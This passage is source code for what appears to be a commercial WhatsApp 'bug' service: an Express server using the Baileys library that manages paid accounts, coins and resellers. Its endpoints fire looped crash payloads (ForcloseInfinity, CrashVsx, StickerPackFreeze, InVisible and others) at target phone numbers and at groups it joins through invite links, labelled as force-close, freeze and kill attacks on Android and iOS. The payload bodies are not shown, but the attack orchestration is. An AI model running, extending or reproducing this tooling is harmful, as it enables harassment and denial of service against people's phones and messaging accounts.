              await trydelay(sock, targetJid);
              await trydelay(sock, targetJid);
              await trydelay(sock, targetJid);
              await trydelay(sock, targetJid);
              await trydelay(sock, targetJid);
              await UiSystem(sock, targetJid);
              await UiSystem(sock, targetJid);
              await UiSystem(sock, targetJid);
              await sleep(100);
            }
            break;
          case "spam_call":
            for (let i = 0; i < 100; i++) {
              await UiAttack(sock, targetJid);
              await Blankletter(sock, targetJid);
              await UiAttack(sock, targetJid);
              await BlankXUi(sock, targetJid);
              await BlankXUi(sock, targetJid);
              await BlankXUi(sock, targetJid);
              await StickerPackFreeze(sock, targetJid);
              await StickerPackFreeze(sock, targetJid);
              await StickerPackFreeze(sock, targetJid);
              await PouButtonUi(sock, targetJid);
              await PouButtonUi(sock, targetJid);
              await PouButtonUi(sock, targetJid);
              await UiSystem(sock, targetJid);
              await UiSystem(sock, targetJid);
              await UiSystem(sock, targetJid);
              await sleep(100);
            }
            break;
          case "android":
            for (let i = 0; i < 100; i++) {
              await Blankletter(sock, targetJid);
              await CrashVsx(sock, targetJid);
              await CrashVsx(sock, targetJid);
              await Blankletter(sock, targetJid);
              await Blankletter(sock, targetJid);
              await Blankletter(sock, targetJid);
              await CrashVsx(sock, targetJid);
              await Blankletter(sock, targetJid);
              await Blankletter(sock, targetJid);
              await PouButtonUi(sock, targetJid);
              await Blankletter(sock, targetJid);
              await PouButtonUi(sock, targetJid);
              await UiSystem(sock, targetJid);
              await UiSystem(sock, targetJid);
              await UiSystem(sock, targetJid);
              await sleep(100);
            }
            break;
          case "invisible":
            for (let i = 0; i < 100; i++) {
              await odx(sock, targetJid);
              await odx(sock, targetJid);
              await odx(sock, targetJid);
              await InVisible(sock, targetJid);
              await InVisible(sock, targetJid);
              await InVisible(sock, targetJid);
              await InVisible(sock, targetJid);
              await InVisible(sock, targetJid);
              await InVisible(sock, targetJid);
              await sleep(100);
            }
            break;
          case "ios_invis":
            for (let i = 0; i < 10; i++) {
              await ForcloseInfinity(sock, targetJid);
              await ForcloseInfinity(sock, targetJid);
              await ForcloseInfinity(sock, targetJid);
              await ForcloseInfinity(sock, targetJid);
              await ForcloseInfinity(sock, targetJid);
              await ForcloseInfinity(sock, targetJid);
              await ForcloseInfinity(sock, targetJid);
              await ForcloseInfinity(sock, targetJid);
              await sleep(100);
            }
            break;
          case "cxinv":
            for (let i = 0; i < 100; i++) {
              await UiAttack(sock, targetJid);
              await UiAttack(sock, targetJid);
              await UiAttack(sock, targetJid);
              await BlankXUi(sock, targetJid);
              await Astral(sock, targetJid);
              await BlankXUi(sock, targetJid);
              await StickerPackFreeze(sock, targetJid);
              await StickerPackFreeze(sock, targetJid);
              await StickerPackFreeze(sock, targetJid);
              await PouButtonUi(sock, targetJid);
              await PouButtonUi(sock, targetJid);
              await PouButtonUi(sock, targetJid);
              await UiSystem(sock, targetJid);
              await UiSystem(sock, targetJid);
              await UiSystem(sock, targetJid);
              await sleep(100)
            }
            break;
          case "forcloseonemsg":
            for (let i = 0; i < 180; i++) {
              await ForcloseInfinity(sock, targetJid);
              await ForcloseInfinity(sock, targetJid);
              await ForcloseInfinity(sock, targetJid);
              await ForcloseInfinity(sock, targetJid);
              await ForcloseInfinity(sock, targetJid);
              await ForcloseInfinity(sock, targetJid);
              await ForcloseInfinity(sock, targetJid);
              await sleep(100);
            }
          break;
          case "ios_noinvis":
            for (let i = 0; i < 180; i++) {
              await ForcloseOneMsg(sock, targetJid);
              await ForcloseOneMsg(sock, targetJid);
              await efcixblenk(sock, targetJid);
              await efcixblenk(sock, targetJid);
              await efcixblenk(sock, targetJid);
              await ForcloseOneMsg(sock, targetJid);
              await ForcloseOneMsg(sock, targetJid);
              await ForcloseOneMsg(sock, targetJid);
              await sleep(100);
            }
            break;
        }

        console.log(`[✅ BUG] Bug '${bug}' terkirim ke ${target}`);
        return true;
      } catch (err) {
        console.warn(`[⚠️ SEND ERROR] ${err.message}`);
        if (sessionName && err.message === 'Connection Closed') {
          delete activeConnections[sessionName];
        }
        if (!retry) {
          const retrySock = await checkActiveSessionInFolder(user.username);
          if (retrySock) return await attemptSend(retrySock, true);
        }
        console.warn(`[❌ GAGAL] Kirim bug '${bug}' ke ${target}`);
        return false;
      }
    };

    const sock = await checkActiveSessionInFolder(user.username);
    if (!sock) {
      console.warn(`[❌ NO SOCK] Tidak ada koneksi ${isMessBug ? 'Messenger' : 'aktif'} tersedia.`);
      return;
    }

    await attemptSend(sock);
  });
});

function getActiveCredsInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeCreds = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    
    // Cek apakah session ini aktif
    const isActive = activeConnections[sessionName] ? true : false;
    
    activeCreds.push({
      sessionName: sessionName,
      isActive: isActive,
      type: biz[sessionName] ? "Business" : mess[sessionName] ? "Messenger" : "Unknown"
    });
  }

  return activeCreds;
}

// GET /mySender
app.get("/mySender", (req, res) => {
  const { key } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!user) return res.status(401).json({ error: "User not found" });

  const conns = getActiveCredsInFolder(user.username);
  console.log(user.username)
  return res.json({
    valid: true,
    connections: conns
  });
});

// 🔹 Endpoint getPairing
app.get("/getPairing", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ BUG] Key tidak valid.");
    return res.json({ valid: false });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  if (!keyInfo) return res.status(401).json({ error: "Invalid session key" });

  if (!number) return res.status(400).json({ error: "Number is required" });

  try {
  const sessionDir = path.join('permenmd', user.username, number); 

  if (!fs.existsSync(`permenmd/${user.username}`)) fs.mkdirSync(`permenmd/${user.username}`, { recursive: true });
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    keepAliveIntervalMs: 50000,
    logger: pino({ level: "silent" }),
    auth: state,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    generateHighQualityLinkPreview: true,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    version
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number}...`);
        await waiting(3000);
        await pairingWa(number, user.username);
      } else {
        delete activeConnections[number];
      }
    }
  });
  // 🔹 Kalau belum registered, generate pairing code
  if (!sock.authState.creds.registered) {
    await waiting(1000);
    let code = await sock.requestPairingCode(number);
    console.log(code)
    if (code) {
      return res.json({ valid: true, number, pairingCode: code });
    } else {
      return res.json({ valid: false, message: "Already registered or failed to get code" });
    }
  } else {
    return res.json({ valid: false, message: "Already registered" });
  }
  } catch (err) {
    console.error("Error in getPairing:", err.message);
    return res.status(500).json({ error: err.message });
  }
});

// ===== Create Account =====
app.get("/createAccount", (req, res) => {
  const { key, newUser, pass, day } = req.query;
  console.log(`[👤 CREATE] Request create user '${newUser}' dengan key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ CREATE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || !["reseller", "owner", "reseller1"].includes(creator.role)) {
    console.log(`[❌ CREATE] ${creator?.username || "Unknown"} tidak memiliki izin.`);
    return res.json({ valid: true, authorized: false, message: "Not authorized." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (creator.role === "reseller" && parseInt(day) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  if (db.find(u => u.username === newUser)) {
    console.log("[❌ CREATE] Username sudah digunakan.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newAccount = {
    username: newUser,
    password: pass,
    expiredDate: expired.toISOString().split("T")[0],
    role: "member",
  };

  db.push(newAccount);
  saveDatabase(db);
    
    sendToGroups(
      `✅ *Akun Baru Dibuat*\nUsername: ${newAccount.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newAccount.role}`,
        { parse_mode: "Markdown" }
    );

  console.log("[✅ CREATE] Akun berhasil dibuat:", newAccount);
  const logLine = `${creator.username} Created ${newUser} duration ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  return res.json({ valid: true, created: true, user: newAccount });
});
// ===== Delete User (admin only) =====
app.get("/deleteUser", (req, res) => {
  const { key, username } = req.query;
  console.log(`[🗑️ DELETE] Request hapus user '${username}' oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ DELETE] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ DELETE] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can delete users." });
  }

  const index = db.findIndex(u => u.username === username);
  if (index === -1) {
    console.log("[❌ DELETE] User tidak ditemukan.");
    return res.json({ valid: true, deleted: false, message: "User not found." });
  }

  const deletedUser = db[index];
  db.splice(index, 1);
  saveDatabase(db);
        sendToGroups(
      `🗑️ *Akun Dihpus*\nUsername: ${deletedUser.username}\nDihapus Oleh: ${admin.username}\nRole: ${deletedUser.role}`,
        { parse_mode: "Markdown" }
    );
  const logLine = `${admin.username} Deleted ${deletedUser}\n`;
  fs.appendFileSync('logUser.txt', logLine);

  console.log("[✅ DELETE] User berhasil dihapus:", deletedUser);
  return res.json({ valid: true, deleted: true, user: deletedUser });
});

app.get('/ping', (req, res) => {
  res.send('pong');
});

// ===== Show All Users (admin only) =====
app.get("/listUsers", (req, res) => {
  const { key } = req.query;
  console.log(`[📋 LIST] Request lihat semua user oleh key '${key}'`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ LIST] Key tidak valid.");
    return res.json({ valid: false, error: true, message: "Invalid key." });
  }

  const db = loadDatabase();
  const admin = db.find(u => u.username === keyInfo.username);

  if (!admin || admin.role !== "owner") {
    console.log(`[❌ LIST] ${admin?.username || "Unknown"} bukan owner.`);
    return res.json({ valid: true, authorized: false, message: "Only owner can view users." });
  }

  const users = db.map(u => ({
    username: u.username,
    expiredDate: u.expiredDate,
    role: u.role || "member",
  }));

  return res.json({ valid: true, authorized: true, users });
});

// ===== Add User With Role (owner only) =====
app.get("/userAdd", (req, res) => {
  const { key, username, password, role, day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);

  if (!creator || creator.role !== "owner") {
    console.log("[❌ USERADD] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only owner can add user with role." });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: role || "member",
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  saveDatabase(db);
    sendToGroups(
      `✅ *Akun Baru Dibuat*\nUsername: ${newUser.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newUser.role}`,
        { parse_mode: "Markdown" }
    );
  const logLine = `${creator.username} Created ${newUser} Role ${role} Days ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ USERADD] User berhasil dibuat:", newUser);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

// ===== Edit User Expired Date (reseller or owner) =====
app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "owner"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ EDIT] Reseller tidak boleh menambah masa aktif lebih dari 30 hari.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa menambah masa aktif maksimal 30 hari." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // ✅ Tambahan validasi role untuk reseller
  if (editor.role === "reseller" && targetUser.role !== "member") {
    console.log("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== ENDPOINT KHUSUS UNTUK REFRESH COINS =====
app.get("/refreshCoins", (req, res) => {
  const { key } = req.query;
  
  console.log("\n=== 💰 REFRESH COINS REQUEST ===");
  console.log("Key:", key);
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("❌ Invalid key");
    return res.json({ valid: false, message: "Invalid key" });
  }
  
  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    console.log("❌ User not found");
    return res.json({ valid: false, message: "User not found" });
  }
  
  if (user.coins === undefined || user.coins === null) {
    user.coins = 100;
    saveDatabase(db);
  }
  
  console.log("✅ Coins untuk", user.username, ":", user.coins);
  console.log("================================\n");
  
  return res.json({
    valid: true,
    coins: user.coins,
    username: user.username,
    role: user.role || "member"
  });
});

// Tambahkan setelah array bugs (sekitar baris 73)
const bugGroup = [
  { bug_id: "group_xml", bug_name: "FORCLOSE ALL WHATSAPP" },
  { bug_id: "invisible", bug_name: "INVISIBLE ALL WHATSAP" },
  { bug_id: "ios_invis", bug_name: "IOS ALL GRUP" }
];

// ===== ENDPOINT GET GROUP BUGS LIST =====
app.get('/getGroupBugs', (req, res) => {
  res.json({
    success: true,
    data: groupBugs
  });
});

// ===== ENDPOINT SEND GROUP BUG =====
app.get('/sendGroupBug', async (req, res) => {
  const { key, link, bug } = req.query;

  // Validasi key
  const user = sikmanuk.find(e => e.sessionKey === key);
  if (!user) {
    return res.json({
      valid: false,
      sended: false,
      cooldown: false,
      message: "Session key tidak valid"
    });
  }

  // Cek cooldown
  const now = Date.now();
  const cooldownKey = `groupBug_${user.username}`;
  
  if (activeKeys[cooldownKey] && now < activeKeys[cooldownKey]) {
    const waitTime = Math.ceil((activeKeys[cooldownKey] - now) / 1000);
    return res.json({
      valid: true,
      sended: false,
      cooldown: true,
      wait: waitTime,
      message: `Tunggu ${waitTime} detik`
    });
  }

  // Validasi link group
  if (!link || !link.includes('chat.whatsapp.com')) {
    return res.json({
      valid: true,
      sended: false,
      cooldown: false,
      message: "Link group WhatsApp tidak valid"
    });
  }

  // Extract group code dari link
  const groupCode = link.split('chat.whatsapp.com/')[1];
  if (!groupCode) {
    return res.json({
      valid: true,
      sended: false,
      cooldown: false,
      message: "Format link group tidak valid"
    });
  }

  try {
    // Ambil socket user
    const sock = mess[user.username] || biz[user.username];
    
    if (!sock) {
      return res.json({
        valid: true,
        sended: false,
        cooldown: false,
        message: "WhatsApp belum terhubung. Silakan scan QR code terlebih dahulu."
      });
    }

    // Join group dulu
    let groupMetadata;
    try {
      const joinResult = await sock.groupAcceptInvite(groupCode);
      groupMetadata = await sock.groupMetadata(joinResult);
    } catch (joinError) {
      return res.json({
        valid: true,
        sended: false,
        cooldown: false,
        message: "Gagal join group. Link mungkin invalid atau expired."
      });
    }

    const groupJid = groupMetadata.id;

    // Kirim bug berdasarkan tipe
    switch (bug) {
      case "group_xml":
        for (let i = 0; i < 5; i++) {
          await DelaySpamingBeta(sock, groupJid, true);
          await sleep(1000);
        }
        break;

      case "invisible":
        for (let i = 0; i < 10; i++) {
          await InVisible(sock, groupJid);
          await sleep(500);
        }
        break;

      case "ios_invis":
        for (let i = 0; i < 5; i++) {
          await ContacXMsg(sock, groupJid);
          await sleep(1000);
        }
        break;

      default:
        return res.json({
          valid: true,
          sended: false,
          cooldown: false,
          message: "Tipe bug tidak dikenali"
        });
    }

    // Set cooldown 30 detik
    activeKeys[cooldownKey] = now + 30000;

    // Kirim notifikasi ke Telegram
    const notifText = `
🔴 *GROUP BUG ATTACK*

👤 Username: \`${user.username}\`
🎯 Target: Group
🔗 Link: \`${link}\`
🐛 Bug Type: \`${bug}\`
⏰ Time: ${new Date().toLocaleString('id-ID')}
    `.trim();

    sendToGroups(notifText, { parse_mode: "Markdown" });

    res.json({
      valid: true,
      sended: true,
      cooldown: false,
      message: "Bug berhasil dikirim ke group"
    });

  } catch (error) {
    console.error("Error sending group bug:", error);
    res.json({
      valid: true,
      sended: false,
      cooldown: false,
      message: "Gagal mengirim bug: " + error.message
    });
  }
});

const bugscustom = [
  { "bug_id": "xml", "bug_name": "Xml Auto Kill" },
  { "bug_id": "Xaver", "bug_name": "Sistem Auto Kill" },
  { "bug_id": "hard", "bug_name": "Sistem Auto Delay" },
  { "bug_id": "cxinv", "bug_name": "Sistem Auto Blank" },
  { "bug_id": "xcom", "bug_name": "Auto Payload" },
  { "bug_id": "android", "bug_name": "Killer Andoid" },
  { "bug_id": "invisible", "bug_name": "Sistem Invisble" },
  { "bug_id": "ios_kil", "bug_name": "Auto Kill Ios" },
];

app.get("/sendCustomBug", async (req, res) => {
  const { key, bugs, target, qty, delay, senderType } = req.query;
  
  // Parse bugs (format: "crash_spam,spam_call,hard")
  const bugList = bugs.split(',');
  const qtyNum = parseInt(qty) || 1;
  const delayNum = parseInt(delay) || 100;
  
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid key" });
  }

  // Response dulu
  res.json({
    valid: true,
    sended: true,
    details: {
      bugs: bugList,
      qty: qtyNum,
      delay: delayNum,
      senderType: senderType || "global"
    }
  });

  // Kirim bug di background
  setImmediate(async () => {
    const sock = senderType === "private" ? biz[keyInfo.username] : mess["global"];
    if (!sock) return;

    const targetJid = target + "@s.whatsapp.net";

    for (const bugId of bugList) {
      for (let i = 0; i < qtyNum; i++) {
        await sendBugById(sock, targetJid, bugId);
        await sleep(delayNum);
      }
    }
  });
});

// Helper function
async function sendBugById(sock, targetJid, bugId) {
  switch (bugId) {
    case "xcom":
      for (let i = 0; i < 10; i++) {
        await FcRelog(sock, targetJid);
      }
      break;
    case "cxinv":
      for (let i = 0; i < 10; i++) {
        await Blankletter(sock, targetJid);
        await Blankletter(sock, targetJid);
      }
      break;
    case "Xaver":
      for (let i = 0; i < 10; i++) {
        await trydelay(sock, targetJid);
        await trydelay(sock, targetJid);
      }
      break;
    case "xml":
      for (let i = 0; i < 10; i++) {
        await ForcloseInfinity(sock, targetJid);
        await ForcloseInfinity(sock, targetJid);
      }
      break;
    case "hard":
      for (let i = 0; i < 10; i++) {
        await odx(sock, targetJid);
        await InVisible(sock, targetJid);
      }
      break;
    case "android":
      for (let i = 0; i < 10; i++) {
        await Astral(sock, targetJid);
        await Astral(sock, targetJid);
      }
      break;
    case "invisible":
      for (let i = 0; i < 10; i++) {
        await odx(sock, targetJid);
        await InVisible(sock, targetJid);
      }
      break;
    case "ios_kil":
      for (let i = 0; i < 10; i++) {
        await ForcloseOneMsg(sock, targetJid);
      }
      break;
    case "ios_noinvis":
      for (let i = 0; i < 10; i++) {
        await FcRelog(sock, targetJid);
        await ForcloseInfinity(sock, targetJid);
      }
      break;
    case "forcloseonemsg":
      for (let i = 0; i < 10; i++) {
        await ForcloseInfinity(sock, targetJid);
        await Astral(sock, targetJid);
      }
      break;
  }
}


// ===== ENDPOINT REDEEM CODE =====
app.get("/redeem", (req, res) => {
  const { key, code } = req.query;

  console.log(`[🎁 REDEEM] Request dari key: ${key}, code: ${code}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ REDEEM] Invalid key");
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    console.log("[❌ REDEEM] User not found");
    return res.json({ valid: false, message: "User not found" });
  }

  // Load redeem codes
  const redeemCodes = loadRedeemCodes();
  const redeemData = redeemCodes.find(r => r.code === code.toUpperCase());

  if (!redeemData) {
    console.log("[❌ REDEEM] Invalid code");
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Kode redeem tidak valid" 
    });
  }

  if (redeemData.used) {
    console.log("[❌ REDEEM] Code already used");
    return res.json({ 
      valid: true, 
      success: false, 
      message: `Kode sudah digunakan oleh ${redeemData.used_by} pada ${new Date(redeemData.used_at).toLocaleString("id-ID")}` 
    });
  }

  // Validasi role - hanya bisa redeem jika role sesuai atau lebih tinggi
  const roleHierarchy = {
    member: 1,
    reseller: 2,
    vip: 3,
    owner: 4
  };

  const userRole = user.role || "member";
  const codeRole = redeemData.role;

  if (roleHierarchy[userRole] < roleHierarchy[codeRole]) {
    console.log("[❌ REDEEM] Role not allowed");
    return res.json({ 
      valid: true, 
      success: false, 
      message: `Kode ini hanya untuk role ${codeRole.toUpperCase()} atau lebih tinggi. Role kamu: ${userRole.toUpperCase()}` 
    });
  }

  // Redeem successful - add coins
  if (user.coins === undefined) user.coins = 0;
  
  const oldCoins = user.coins;
  user.coins += redeemData.amount;
  saveDatabase(db);

  // Mark code as used
  redeemData.used = true;
  redeemData.used_by = user.username;
  redeemData.used_at = new Date().toISOString();
  saveRedeemCodes(redeemCodes);

  console.log(`[✅ REDEEM] ${user.username} redeemed ${code} (+${redeemData.amount} coins)`);

  // Log to file
  const logLine = `${new Date().toISOString()} | REDEEM | ${user.username} redeemed ${code} (${codeRole}) for ${redeemData.amount} coins | Balance: ${oldCoins} → ${user.coins}\n`;
  fs.appendFileSync('logTopup.txt', logLine);

  // Notify to Telegram group
  sendToGroupsUtama(`🎁 *Kode Redeem Digunakan*

🎟 Kode: \`${code}\`
🎯 Role: ${codeRole.toUpperCase()}
👤 User: ${user.username}
💰 Nilai: ${redeemData.amount} coins
⏰ Waktu: ${new Date().toLocaleString("id-ID")}`, { parse_mode: "Markdown" });

  return res.json({
    valid: true,
    success: true,
    amount: redeemData.amount,
    message: "Redeem berhasil!",
    coins_before: oldCoins,
    coins_after: user.coins
  });
});

// ===== ENDPOINT GIFT COIN (FIXED) =====
app.post("/giftCoin", (req, res) => {
  const { key, fromUsername, toUsername, amount } = req.body;

  console.log(`[🎁 GIFT DEBUG]`);
  console.log(`Key: ${key}`);
  console.log(`From: ${fromUsername}`);
  console.log(`To: ${toUsername}`);
  console.log(`Amount: ${amount}`);

  // ✅ VALIDASI KEY
  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ GIFT] Invalid key");
    return res.json({ 
      valid: false, 
      message: "Invalid session key" 
    });
  }

  // ✅ VALIDASI USERNAME PENGIRIM
  if (keyInfo.username.toLowerCase() !== fromUsername.toLowerCase()) {
    console.log("[❌ GIFT] Username mismatch");
    return res.json({ 
      valid: false, 
      message: "Username tidak sesuai dengan session" 
    });
  }

  const db = loadDatabase();
  const fromUser = db.find(u => u.username.toLowerCase() === fromUsername.toLowerCase());
  
  if (!fromUser) {
    console.log("[❌ GIFT] Sender not found");
    return res.json({ 
      valid: false, 
      message: "User pengirim tidak ditemukan" 
    });
  }

  // ✅ VALIDASI AMOUNT
  const giftAmount = parseInt(amount);
  if (!giftAmount || giftAmount <= 0) {
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Jumlah coin tidak valid" 
    });
  }

  // ✅ CEK SALDO
  if (fromUser.coins === undefined) fromUser.coins = 0;
  
  if (fromUser.coins < giftAmount) {
    console.log(`[❌ GIFT] Insufficient coins: ${fromUser.coins} < ${giftAmount}`);
    return res.json({ 
      valid: true, 
      success: false, 
      message: `Coin tidak cukup! Saldo: ${fromUser.coins}, dibutuhkan: ${giftAmount}` 
    });
  }

  // ✅ CEK USER TUJUAN
  const toUser = db.find(u => u.username.toLowerCase() === toUsername.toLowerCase());
  
  if (!toUser) {
    console.log("[❌ GIFT] Recipient not found");
    return res.json({ 
      valid: true, 
      success: false, 
      message: `User ${toUsername} tidak ditemukan` 
    });
  }

  // ✅ CEGAH KIRIM KE DIRI SENDIRI
  if (fromUsername.toLowerCase() === toUsername.toLowerCase()) {
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Tidak bisa mengirim gift ke diri sendiri" 
    });
  }

  // ✅ TRANSFER COINS
  if (toUser.coins === undefined) toUser.coins = 0;
  
  const fromOldCoins = fromUser.coins;
  const toOldCoins = toUser.coins;
  
  fromUser.coins -= giftAmount;
  toUser.coins += giftAmount;
  
  saveDatabase(db);

  console.log(`[✅ GIFT] ${fromUsername} sent ${giftAmount} coins to ${toUsername}`);

  // ✅ LOG TO FILE
  const logLine = `${new Date().toISOString()} | GIFT | ${fromUsername} → ${toUsername} | ${giftAmount} coins | ${fromUsername}: ${fromOldCoins} → ${fromUser.coins} | ${toUsername}: ${toOldCoins} → ${toUser.coins}\n`;
  fs.appendFileSync('logTopup.txt', logLine);

  // ✅ NOTIFY TO TELEGRAM
  sendToGroupsUtama(`🎁 *Gift Coin Terkirim*

📤 Dari: ${fromUsername}
📥 Ke: ${toUsername}
💰 Jumlah: ${giftAmount} coins
⏰ Waktu: ${new Date().toLocaleString("id-ID")}

Saldo ${fromUsername}: ${fromOldCoins} → ${fromUser.coins}
Saldo ${toUsername}: ${toOldCoins} → ${toUser.coins}`, { parse_mode: "Markdown" });

  return res.json({
    valid: true,
    success: true,
    message: "Gift berhasil dikirim!",
    from_coins_before: fromOldCoins,
    from_coins_after: fromUser.coins,
    to_coins_before: toOldCoins,
    to_coins_after: toUser.coins
  });
});

// ===== ENDPOINT REQUEST TOP UP DARI APLIKASI =====
app.post("/requestTopup", (req, res) => {
  const { key, amount } = req.body;

  console.log(`[💰 TOPUP REQUEST] Key: ${key}, Amount: ${amount}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    console.log("[❌ TOPUP] Invalid key");
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    console.log("[❌ TOPUP] User not found");
    return res.json({ valid: false, message: "User not found" });
  }

  // Validasi amount
  if (!amount || amount < 25) {
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Minimal top up adalah 25 coin" 
    });
  }

  // Check if user has pending request
  const topupRequests = loadTopupRequests();
  const hasPending = topupRequests.find(r => r.username === user.username && r.status === "pending");

  if (hasPending) {
    return res.json({ 
      valid: true, 
      success: false, 
      message: "Kamu masih memiliki request top up yang pending. Tunggu hingga diproses." 
    });
  }

  // Create new request
  const requestId = crypto.randomBytes(4).toString("hex").toUpperCase();
  const newRequest = {
    requestId,
    userId: null, // tidak ada telegram ID dari app
    username: user.username,
    amount: parseInt(amount),
    status: "pending",
    timestamp: new Date().toISOString(),
    source: "app" // penanda dari aplikasi
  };

  topupRequests.push(newRequest);
  saveTopupRequests(topupRequests);

  console.log(`[✅ TOPUP REQUEST] Created: ${requestId} for ${user.username}`);

  // KIRIM NOTIFIKASI KE OWNER ID SAJA (BUKAN KE GRUP)
  const options = {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: `approve_${requestId}` },
          { text: "❌ Reject", callback_data: `reject_${requestId}` }
        ]
      ]
    }
  };

  bot.sendMessage(OWNER_ID, `🔔 *Top Up Request Baru (dari App)*

📋 Request ID: \`${requestId}\`
👤 Username: ${user.username}
💰 Jumlah: ${amount} coins
📱 Source: Mobile App
⏰ Waktu: ${new Date().toLocaleString("id-ID")}

Klik tombol di bawah untuk approve/reject:`, options);

  return res.json({
    valid: true,
    success: true,
    requestId,
    message: "Request top up berhasil dibuat! Silakan tunggu konfirmasi dari admin.",
    amount: parseInt(amount)
  });
});

// ===== ENDPOINT CEK STATUS TOP UP REQUEST =====
app.get("/checkTopupStatus", (req, res) => {
  const { key, requestId } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) {
    return res.json({ valid: false, message: "Invalid session key" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);
  
  if (!user) {
    return res.json({ valid: false, message: "User not found" });
  }

  const topupRequests = loadTopupRequests();
